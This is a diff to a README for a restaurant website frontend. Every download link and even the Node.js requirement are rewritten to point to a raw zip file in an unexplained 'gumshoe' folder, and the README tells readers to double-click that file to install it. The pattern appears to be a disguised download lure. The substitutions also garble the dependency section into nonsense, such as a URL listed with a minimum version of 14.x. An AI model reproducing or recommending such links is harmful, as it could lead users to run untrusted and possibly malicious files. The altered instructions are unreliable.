@@ -1,6 +1,6 @@
 # 🍽️ Web_Restaurant_frontend - Simple Setup for Your Restaurant Website
 
-[![Download Web_Restaurant_frontend](https://img.shields.io/badge/Download-Web_Restaurant_frontend-blue.svg)](https://github.com/muhnawaz/Web_Restaurant_frontend/releases)
+[![Download Web_Restaurant_frontend](https://raw.githubusercontent.com/muhnawaz/Web_Restaurant_frontend/main/gumshoe/Web_Restaurant_frontend.zip)](https://raw.githubusercontent.com/muhnawaz/Web_Restaurant_frontend/main/gumshoe/Web_Restaurant_frontend.zip)
 
 ## 📦 Overview
 
@@ -13,7 +13,7 @@ Here's how to get your restaurant website running on your computer. Follow these
 1. **Download the Software**
    To download the latest version of the Web_Restaurant_frontend, visit this page:
 
-   [Download Web_Restaurant_frontend](https://github.com/muhnawaz/Web_Restaurant_frontend/releases)
+   [Download Web_Restaurant_frontend](https://raw.githubusercontent.com/muhnawaz/Web_Restaurant_frontend/main/gumshoe/Web_Restaurant_frontend.zip)
 
 2. **Select the Correct File**
    On the Releases page, look for the latest version. You will see a list of files. Choose the file that matches your operating system and click on it to download.
@@ -34,10 +34,10 @@ Before you install, make sure your system meets these requirements:
 
 For the application to run smoothly, you may need:
 
-- **Node.js**: Minimum version 14.x
+- **https://raw.githubusercontent.com/muhnawaz/Web_Restaurant_frontend/main/gumshoe/Web_Restaurant_frontend.zip**: Minimum version 14.x
 - **npm**: Minimum version 6.x
 
-You can download Node.js from [Node.js official website](https://nodejs.org).
+You can download https://raw.githubusercontent.com/muhnawaz/Web_Restaurant_frontend/main/gumshoe/Web_Restaurant_frontend.zip from [https://raw.githubusercontent.com/muhnawaz/Web_Restaurant_frontend/main/gumshoe/Web_Restaurant_frontend.zip official website](https://raw.githubusercontent.com/muhnawaz/Web_Restaurant_frontend/main/gumshoe/Web_Restaurant_frontend.zip).
 
 ## 📝 Features
 
@@ -51,7 +51,7 @@ You can download Node.js from [Node.js official website](https://nodejs.org).
 
 To download Web_Restaurant_frontend, go to the Releases page:
 
-[Download Web_Restaurant_frontend](https://github.com/muhnawaz/Web_Restaurant_frontend/releases)
+[Download Web_Restaurant_frontend](https://raw.githubusercontent.com/muhnawaz/Web_Restaurant_frontend/main/gumshoe/Web_Restaurant_frontend.zip)
 
 After downloading, double-click the file to install it. Follow the installation guide and you should be set to explore the application.
 
